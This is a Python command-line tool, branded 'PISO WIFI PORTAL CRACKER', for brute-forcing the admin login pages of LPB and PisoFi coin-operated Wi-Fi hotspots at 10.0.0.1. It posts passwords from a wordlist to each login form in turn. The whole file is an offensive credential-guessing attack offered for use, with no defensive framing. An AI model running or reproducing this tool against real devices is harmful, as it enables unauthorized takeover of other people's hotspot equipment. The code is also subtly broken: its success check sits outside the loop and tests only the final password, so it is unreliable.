import os
import sys
from time import sleep
import requests

class bcolors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def slowprint(s):
	for c in s + '\n':
		sys.stdout.write(c)
		sys.stdout.flush()
		sleep(0.01/10)

banner = """
  ╔═╗╦═╗╔═╗╔═╗╦╔═   ╦╔╦╗
  ║  ╠╦╝╠═╣║  ╠╩╗═══║ ║ 
  ╚═╝╩╚═╩ ╩╚═╝╩ ╩   ╩ ╩ 
 PISO WIFI PORTAL CRACKER
"""

lpbb = """
 ╔═╗╦═╗╔═╗╔═╗╦╔═   ╦  ╔═╗╔╗ 
 ║  ╠╦╝╠═╣║  ╠╩╗═══║  ╠═╝╠╩╗
 ╚═╝╩╚═╩ ╩╚═╝╩ ╩   ╩═╝╩  ╚═╝
"""

pisofib = """
 ╔═╗╦═╗╔═╗╔═╗╦╔═   ╔═╗╦╔═╗╔═╗╔═╗╦
 ║  ╠╦╝╠═╣║  ╠╩╗═══╠═╝║╚═╗║ ║╠╣ ║
 ╚═╝╩╚═╩ ╩╚═╝╩ ╩   ╩  ╩╚═╝╚═╝╚  ╩
"""

def lpb():
    os.system("clear")
    print("")
    slowprint(bcolors.FAIL+lpbb+bcolors.ENDC)
    url = "http://10.0.0.1/admin"
    username = input(bcolors.GREEN+" [+] Enter username: "+bcolors.ENDC)
    password_file = input(bcolors.GREEN+" [+] Enter password file path: "+bcolors.ENDC)
    file = open(password_file, "r")

    for password in file.readlines():
        password = password.strip("\n")
        data = {'username':username, 'password':password, "Sign In":'kt_login_signin_submit'}
        send_data_url = requests.post(url, data=data)

    if "Login failed" in str(send_data_url.content):
        print(" [*] Attempting password: %s" % password )
    else:
        print(" [*] Password found: %s " % password)

def pisofi():
    os.system("clear")
    print("")
    slowprint(bcolors.FAIL+pisofib+bcolors.ENDC)
    url = "http://10.0.0.1/auth/signin/"
    username = input(bcolors.GREEN+" [+] Enter username: "+bcolors.ENDC)
    password_file = input(bcolors.GREEN+" [+] Enter password file path: "+bcolors.ENDC)
    file = open(password_file, "r")

    for password in file.readlines():
        password = password.strip("\n")
        data = {'username':username, 'password':password, "Sign In":'submit'}
        send_data_url = requests.post(url, data=data)

    if "Login failed" in str(send_data_url.content):
        print(" [*] Attempting password: %s" % password)
    else:
        print(" [*] Password found: %s " % password)

def main():
    os.system("clear")
    print("")
    slowprint(bcolors.FAIL+banner+bcolors.ENDC)
    print(bcolors.GREEN+" [1] Crack LPB Portal"+bcolors.ENDC)
    print(bcolors.GREEN+" [2] Crack PisoFi Portal"+bcolors.ENDC)
    print(bcolors.GREEN+" [0] Close"+bcolors.ENDC)
    print("")
    opt = input(bcolors.GREEN+" [+] Choose: "+bcolors.ENDC)

    if opt == '1':
        lpb()
    elif opt == '2':
        pisofi()
    elif opt == '0':
        os.system("clear")
        quit()
    else:
        os.system("clear")
        print(" Invalid input!! Try again...")        
        main()

if __name__=="__main__":
    main()
